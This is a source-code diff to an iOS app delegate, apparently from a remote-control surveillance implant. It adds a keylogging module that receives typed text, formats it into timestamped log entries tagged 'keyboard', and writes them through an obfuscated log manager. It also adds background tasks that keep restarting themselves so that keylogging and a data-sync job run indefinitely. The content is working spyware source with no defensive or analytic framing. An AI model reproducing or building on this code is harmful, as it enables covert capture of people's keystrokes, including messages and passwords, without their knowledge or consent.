@@ -10,6 +10,7 @@
 #import "AppDelegate.h"
 #import "RCSIGlobals.h"
 #import "RESTNetworkProtocol.h"
+#import "RCSILogManager.h"
 
 typedef struct _sync {
     u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
@@ -96,10 +97,12 @@ void asciiToHex(char *string, char binary[])
 
 @implementation AppDelegate
 
+@synthesize expirationHandlerKeyboard;
 @synthesize expirationHandler;
 @synthesize bgTask;
 @synthesize background;
 @synthesize jobExpired;
+@synthesize keyBoardReceiver;
 
 #define ACTION_SYNC         0x4001
 
@@ -159,6 +162,111 @@ void asciiToHex(char *string, char binary[])
     });
 }
 
+#pragma mark -
+#pragma mark - Backgorund keyboard task
+#pragma mark -
+
+#define DELIMETER     0xABADC0DE
+
+- (void)writeKeylog:(NSString*)bufferString
+{
+  time_t rawtime;
+  struct tm *tmTemp;
+  NSMutableData *processName;
+  NSMutableData *windowName;
+  NSMutableData *contentData;
+  
+  NSMutableData *entryData = [[NSMutableData alloc] init];
+  short unicodeNullTerminator = 0x0000;
+  
+  // Dummy word
+  short dummyWord = 0x0000;
+  [entryData appendBytes: &dummyWord
+                  length: sizeof(short)];
+  
+  // Struct tm
+  time (&rawtime);
+  tmTemp = gmtime(&rawtime);
+  tmTemp->tm_year += 1900;
+  tmTemp->tm_mon  ++;
+  
+  //
+  // Our struct is 0x8 bytes bigger than the one declared on win32
+  // this is just a quick fix
+  [entryData appendBytes: (const void *)tmTemp
+                  length: sizeof (struct tm) - 0x8];
+  
+  NSString *info = [NSString stringWithFormat:@"%s", "keyboard"];
+  
+  processName  = [NSMutableData dataWithBytes:[info cStringUsingEncoding:NSUTF16LittleEndianStringEncoding]
+                                        length:[info lengthOfBytesUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+
+  
+  // Process Name
+  [entryData appendData: processName];
+  // Null terminator
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
+  
+  windowName = [NSMutableData dataWithBytes:[info cStringUsingEncoding:NSUTF16LittleEndianStringEncoding]
+                                     length:[info lengthOfBytesUsingEncoding:NSUTF16LittleEndianStringEncoding]];
+  
+  // Window Name
+  [entryData appendData: windowName];
+  // Null terminator
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
+  
+  // Delimeter
+  unsigned long del = DELIMETER;
+  [entryData appendBytes: &del
+                  length: sizeof(del)];
+  
+  
+  contentData = [[NSMutableData alloc] initWithData:
+                 [bufferString dataUsingEncoding:
+                  NSUTF16LittleEndianStringEncoding]];
+  
+  // Log buffer
+  [entryData appendData: contentData];
+  
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
+  
+  if ([logManager createLog:LOG_KEYLOG
+                agentHeader:nil
+                  withLogID:0])
+  {
+    [logManager writeDataToLog:entryData
+                      forAgent:LOG_KEYLOG
+                     withLogID:0];
+  }
+  
+  [logManager closeActiveLog:LOG_KEYLOG withLogID:0];
+}
+
+- (void)startBackgroundKeyboard
+{
+  NSLog(@"Keyboard restarted!");
+  
+  dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+    while (TRUE)
+    {
+      [NSThread sleepForTimeInterval:1.0];
+      
+      NSArray *messages = [keyBoardReceiver receiveMessages];
+      
+      if (messages != nil)
+      {
+        for (int i=0; i < [messages count]; i++)
+        {
+          ReceivedMessage *mess = [messages objectAtIndex:i];
+          if (mess != nil)
+            [self writeKeylog:mess.text];
+        }
+      }
+    }
+  });
+}
 
 #pragma mark -
 #pragma mark - AppDelegate Init
@@ -185,8 +293,61 @@ void asciiToHex(char *string, char binary[])
   
 }
 
+#pragma mark -
+#pragma mark - Init Background tasks
+#pragma mark -
+
+- (void)startKeyboardBackgroundTask
+{
+  UIApplication *app = [UIApplication sharedApplication];
+  
+  self.expirationHandlerKeyboard = ^{
+    
+    [app endBackgroundTask:self.bgTaskKeyboard];
+    
+    self.bgTaskKeyboard = UIBackgroundTaskInvalid;
+    self.bgTaskKeyboard = [app beginBackgroundTaskWithExpirationHandler:expirationHandlerKeyboard];
+    
+    [self startBackgroundKeyboard];
+  };
+  
+  self.bgTaskKeyboard = [app beginBackgroundTaskWithExpirationHandler:expirationHandlerKeyboard];
+  
+  [self startBackgroundKeyboard];
+}
+
+- (void)startSynchBackgroundTask
+{
+  UIApplication *app = [UIApplication sharedApplication];
+  
+  self.expirationHandler = ^{
+    
+    [app endBackgroundTask:self.bgTask];
+    
+    @synchronized(self)
+    {
+      self.jobExpired = YES;
+    }
+    
+    self.bgTask = UIBackgroundTaskInvalid;
+    self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
+    
+    [self startBackgroundSynch];
+  };
+  
+  self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
+  
+  [self startBackgroundSynch];
+}
+
+#pragma mark -
+#pragma mark - AppDelegate callback
+#pragma mark -
+
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
 {
+    keyBoardReceiver = [[KeyboardReceiver alloc] init];
+  
     // Init Keys
     [self initAppKeys];
   
@@ -206,27 +367,12 @@ void asciiToHex(char *string, char binary[])
         }
      }];
   
+    // Init keyboard background task
+    [self startBackgroundKeyboard];
+  
     // Init synch backgorund task
-    UIApplication *app = [UIApplication sharedApplication];
-    self.expirationHandler = ^{
-        
-        [app endBackgroundTask:self.bgTask];
-        
-        @synchronized(self)
-        {
-            self.jobExpired = YES;
-        }
-      
-        self.bgTask = UIBackgroundTaskInvalid;
-        self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
-        
-        [self startBackgroundSynch];
-    };
-    
-    self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
-    
     [self startBackgroundSynch];
-    
+  
     return YES;
 }
 
